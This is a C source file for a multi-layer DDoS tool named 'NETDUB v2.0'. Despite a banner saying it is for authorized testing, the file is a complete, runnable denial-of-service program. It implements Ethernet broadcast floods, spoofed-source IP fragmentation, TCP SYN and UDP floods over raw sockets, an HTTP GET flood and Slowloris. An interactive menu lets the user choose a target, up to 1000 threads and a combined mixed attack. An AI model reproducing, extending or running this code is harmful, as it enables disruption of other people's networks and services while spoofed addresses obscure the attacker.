#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <signal.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>

#define MAX_THREADS 1000
#define PACKET_SIZE 1500
#define BUFFER_SIZE 65536
#define MAX_SOCKETS 65535

// Colors for output
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"
#define WHITE   "\033[37m"
#define RESET   "\033[0m"

// Attack parameters
typedef struct {
    char target_ip[16];
    int target_port;
    int attack_type;
    int thread_count;
    int duration;
    int intensity;
    int packet_size;
    volatile int *running;
} attack_params_t;

// Global statistics
volatile long long total_packets = 0;
volatile long long total_bytes = 0;
volatile int running = 1;

// Raw socket for layer 3/4 attacks
int raw_socket;

// Pseudo header for TCP checksum
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

// Banner
void print_banner() {
    printf(CYAN "╔══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(CYAN "║" RED "                         NETDUB v2.0                         " CYAN "║\n" RESET);
    printf(CYAN "║" YELLOW "                   ULTIMATE DDOS TESTING SUITE               " CYAN "║\n" RESET);
    printf(CYAN "║" WHITE "                    Root Access Required                     " CYAN "║\n" RESET);
    printf(CYAN "╠══════════════════════════════════════════════════════════════╣\n" RESET);
    printf(CYAN "║" GREEN " Layer 2: " WHITE "Ethernet Flooding                               " CYAN "║\n" RESET);
    printf(CYAN "║" GREEN " Layer 3: " WHITE "IP Fragmentation, ICMP Flood                   " CYAN "║\n" RESET);
    printf(CYAN "║" GREEN " Layer 4: " WHITE "TCP SYN/ACK/RST, UDP Flood                     " CYAN "║\n" RESET);
    printf(CYAN "║" GREEN " Layer 7: " WHITE "HTTP/HTTPS Flood, Slowloris                    " CYAN "║\n" RESET);
    printf(CYAN "╚══════════════════════════════════════════════════════════════╝\n" RESET);
    printf(RED "⚠️  WARNING: FOR TESTING AUTHORIZED SYSTEMS ONLY ⚠️\n" RESET);
    printf(YELLOW "⚠️  REQUIRES ROOT PRIVILEGES FOR MAXIMUM PERFORMANCE ⚠️\n\n" RESET);
}

// Check root privileges
int check_root() {
    if (geteuid() != 0) {
        printf(RED "[!] This tool requires root privileges for maximum performance!\n" RESET);
        printf(YELLOW "[*] Please run as: sudo ./netdub\n" RESET);
        return 0;
    }
    return 1;
}

// Calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    result = ~sum;
    return result;
}

// Generate random IP
unsigned int random_ip() {
    return (rand() % 256) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
}

// Generate random port
unsigned short random_port() {
    return rand() % 65535 + 1;
}

// Statistics thread
void* stats_thread(void* arg) {
    struct timespec start, current;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    while (running) {
        sleep(1);
        clock_gettime(CLOCK_MONOTONIC, &current);
        
        long long elapsed = current.tv_sec - start.tv_sec;
        if (elapsed > 0) {
            long long pps = total_packets / elapsed;
            long long bps = total_bytes / elapsed;
            
            printf(CYAN "[STATS] " WHITE "PPS: " GREEN "%lld " WHITE "| BPS: " GREEN "%lld " WHITE "| Total: " GREEN "%lld packets\n" RESET, 
                   pps, bps, total_packets);
        }
    }
    return NULL;
}

// Layer 2 - Ethernet Flooding
void* ethernet_flood(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    int sock;
    struct sockaddr_ll dest_addr;
    unsigned char packet[PACKET_SIZE];
    
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sll_family = AF_PACKET;
    dest_addr.sll_protocol = htons(ETH_P_ALL);
    dest_addr.sll_ifindex = if_nametoindex("eth0");
    
    while (*params->running) {
        // Generate random ethernet frame
        memset(packet, 0, PACKET_SIZE);
        
        // Ethernet header
        memset(packet, 0xFF, 6); // Broadcast MAC
        for (int i = 6; i < 12; i++) {
            packet[i] = rand() % 256; // Random source MAC
        }
        packet[12] = 0x08; // EtherType
        packet[13] = 0x00; // IP
        
        // Fill with random data
        for (int i = 14; i < params->packet_size; i++) {
            packet[i] = rand() % 256;
        }
        
        if (sendto(sock, packet, params->packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, params->packet_size);
        }
        
        if (params->intensity > 0) {
            usleep(params->intensity);
        }
    }
    
    close(sock);
    return NULL;
}

// Layer 3 - IP Fragmentation Attack
void* ip_fragment_flood(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    struct iphdr *iph;
    struct sockaddr_in dest;
    unsigned char packet[PACKET_SIZE];
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);
    
    while (*params->running) {
        memset(packet, 0, PACKET_SIZE);
        iph = (struct iphdr*)packet;
        
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(params->packet_size);
        iph->id = htons(rand() % 65535);
        iph->frag_off = htons(0x2000 | (rand() % 8191)); // More fragments + random offset
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = dest.sin_addr.s_addr;
        
        // Calculate checksum
        iph->check = checksum(iph, sizeof(struct iphdr));
        
        // Fill with random data
        for (int i = sizeof(struct iphdr); i < params->packet_size; i++) {
            packet[i] = rand() % 256;
        }
        
        if (sendto(raw_socket, packet, params->packet_size, 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, params->packet_size);
        }
        
        if (params->intensity > 0) {
            usleep(params->intensity);
        }
    }
    
    return NULL;
}

// Layer 4 - TCP SYN Flood
void* tcp_syn_flood(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct sockaddr_in dest;
    unsigned char packet[PACKET_SIZE];
    struct pseudo_header psh;
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);
    
    while (*params->running) {
        memset(packet, 0, PACKET_SIZE);
        iph = (struct iphdr*)packet;
        tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum(iph, sizeof(struct iphdr));
        
        // TCP Header
        tcph->source = htons(random_port());
        tcph->dest = htons(params->target_port);
        tcph->seq = htonl(rand() % 4294967295U);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Calculate TCP checksum
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum(pseudogram, psize);
        free(pseudogram);
        
        if (sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr) + sizeof(struct tcphdr));
        }
        
        if (params->intensity > 0) {
            usleep(params->intensity);
        }
    }
    
    return NULL;
}

// Layer 4 - UDP Flood
void* udp_flood(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    struct iphdr *iph;
    struct udphdr *udph;
    struct sockaddr_in dest;
    unsigned char packet[PACKET_SIZE];
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);
    
    while (*params->running) {
        memset(packet, 0, PACKET_SIZE);
        iph = (struct iphdr*)packet;
        udph = (struct udphdr*)(packet + sizeof(struct iphdr));
        
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(params->packet_size);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum(iph, sizeof(struct iphdr));
        
        // UDP Header
        udph->source = htons(random_port());
        udph->dest = htons(params->target_port);
        udph->len = htons(params->packet_size - sizeof(struct iphdr));
        udph->check = 0;
        
        // Fill with random data
        for (int i = sizeof(struct iphdr) + sizeof(struct udphdr); i < params->packet_size; i++) {
            packet[i] = rand() % 256;
        }
        
        if (sendto(raw_socket, packet, params->packet_size, 0, (struct sockaddr*)&dest, sizeof(dest)) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, params->packet_size);
        }
        
        if (params->intensity > 0) {
            usleep(params->intensity);
        }
    }
    
    return NULL;
}

// Layer 7 - HTTP Flood
void* http_flood(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    int sock;
    struct sockaddr_in dest;
    char request[1024];
    char response[4096];
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);
    
    while (*params->running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Set non-blocking
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            close(sock);
            continue;
        }
        
        // Generate HTTP request
        snprintf(request, sizeof(request),
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
                "Connection: keep-alive\r\n"
                "Cache-Control: no-cache\r\n"
                "\r\n",
                rand() % 999999, params->target_ip);
        
        if (send(sock, request, strlen(request), 0) > 0) {
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, strlen(request));
        }
        
        // Try to read response
        recv(sock, response, sizeof(response), 0);
        
        close(sock);
        
        if (params->intensity > 0) {
            usleep(params->intensity);
        }
    }
    
    return NULL;
}

// Layer 7 - Slowloris
void* slowloris_attack(void* arg) {
    attack_params_t* params = (attack_params_t*)arg;
    int sockets[1000];
    int socket_count = 0;
    struct sockaddr_in dest;
    char header[256];
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest.sin_addr);
    
    // Create initial connections
    for (int i = 0; i < 1000 && *params->running; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        fcntl(sock, F_SETFL, O_NONBLOCK);
        
        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) >= 0) {
            // Send partial HTTP request
            snprintf(header, sizeof(header),
                    "GET /?%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0\r\n",
                    rand() % 999999, params->target_ip);
            
            if (send(sock, header, strlen(header), 0) > 0) {
                sockets[socket_count++] = sock;
            } else {
                close(sock);
            }
        } else {
            close(sock);
        }
    }
    
    // Keep connections alive
    while (*params->running) {
        for (int i = 0; i < socket_count; i++) {
            snprintf(header, sizeof(header), "X-a: %d\r\n", rand() % 5000);
            if (send(sockets[i], header, strlen(header), 0) > 0) {
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, strlen(header));
            }
        }
        
        sleep(10);
    }
    
    // Cleanup
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
    
    return NULL;
}

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf(YELLOW "\n[!] Stopping attack...\n" RESET);
}

// Main function
int main() {
    if (!check_root()) {
        return 1;
    }
    
    print_banner();
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Create raw socket
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_socket < 0) {
        perror("raw socket");
        return 1;
    }
    
    int one = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }
    
    // Get target info
    attack_params_t params;
    printf(GREEN "🎯 Target IP: " RESET);
    scanf("%s", params.target_ip);
    printf(GREEN "🔌 Target Port: " RESET);
    scanf("%d", &params.target_port);
    
    printf(GREEN "\n📊 Attack Types:\n" RESET);
    printf("1. Layer 2 - Ethernet Flood\n");
    printf("2. Layer 3 - IP Fragmentation\n");
    printf("3. Layer 4 - TCP SYN Flood\n");
    printf("4. Layer 4 - UDP Flood\n");
    printf("5. Layer 7 - HTTP Flood\n");
    printf("6. Layer 7 - Slowloris\n");
    printf("7. Mixed Attack (ALL)\n");
    printf(GREEN "🎯 Select attack type: " RESET);
    scanf("%d", &params.attack_type);
    
    printf(GREEN "🧵 Thread count (1-1000): " RESET);
    scanf("%d", &params.thread_count);
    if (params.thread_count > MAX_THREADS) params.thread_count = MAX_THREADS;
    
    printf(GREEN "⏱️  Duration (seconds): " RESET);
    scanf("%d", &params.duration);
    
    printf(GREEN "📦 Packet size (bytes): " RESET);
    scanf("%d", &params.packet_size);
    if (params.packet_size > PACKET_SIZE) params.packet_size = PACKET_SIZE;
    
    printf(GREEN "🔥 Intensity (0=max, >0=delay in μs): " RESET);
    scanf("%d", &params.intensity);
    
    params.running = &running;
    
    // Start statistics thread
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Start attack threads
    pthread_t threads[MAX_THREADS];
    void* (*attack_func)(void*) = NULL;
    
    switch (params.attack_type) {
        case 1: attack_func = ethernet_flood; break;
        case 2: attack_func = ip_fragment_flood; break;
        case 3: attack_func = tcp_syn_flood; break;
        case 4: attack_func = udp_flood; break;
        case 5: attack_func = http_flood; break;
        case 6: attack_func = slowloris_attack; break;
        case 7: 
            // Mixed attack - distribute threads across all attack types
            for (int i = 0; i < params.thread_count; i++) {
                switch (i % 6) {
                    case 0: attack_func = ethernet_flood; break;
                    case 1: attack_func = ip_fragment_flood; break;
                    case 2: attack_func = tcp_syn_flood; break;
                    case 3: attack_func = udp_flood; break;
                    case 4: attack_func = http_flood; break;
                    case 5: attack_func = slowloris_attack; break;
                }
                pthread_create(&threads[i], NULL, attack_func, &params);
            }
            break;
        default:
            printf(RED "Invalid attack type!\n" RESET);
            return 1;
    }
    
    if (params.attack_type != 7) {
        for (int i = 0; i < params.thread_count; i++) {
            pthread_create(&threads[i], NULL, attack_func, &params);
        }
    }
    
    printf(RED "\n🚀 ATTACK STARTED!\n" RESET);
    printf(YELLOW "Target: %s:%d\n" RESET, params.target_ip, params.target_port);
    printf(YELLOW "Threads: %d\n" RESET, params.thread_count);
    printf(YELLOW "Duration: %d seconds\n" RESET, params.duration);
    printf(YELLOW "Press Ctrl+C to stop\n\n" RESET);
    
    // Wait for duration or signal
    sleep(params.duration);
    running = 0;
    
    // Wait for threads to finish
    for (int i = 0; i < params.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_tid, NULL);
    
    printf(GREEN "\n✅ Attack finished!\n" RESET);
    printf(CYAN "Total packets sent: %lld\n" RESET, total_packets);
    printf(CYAN "Total bytes sent: %lld\n" RESET, total_bytes);
    
    close(raw_socket);
    return 0;
}
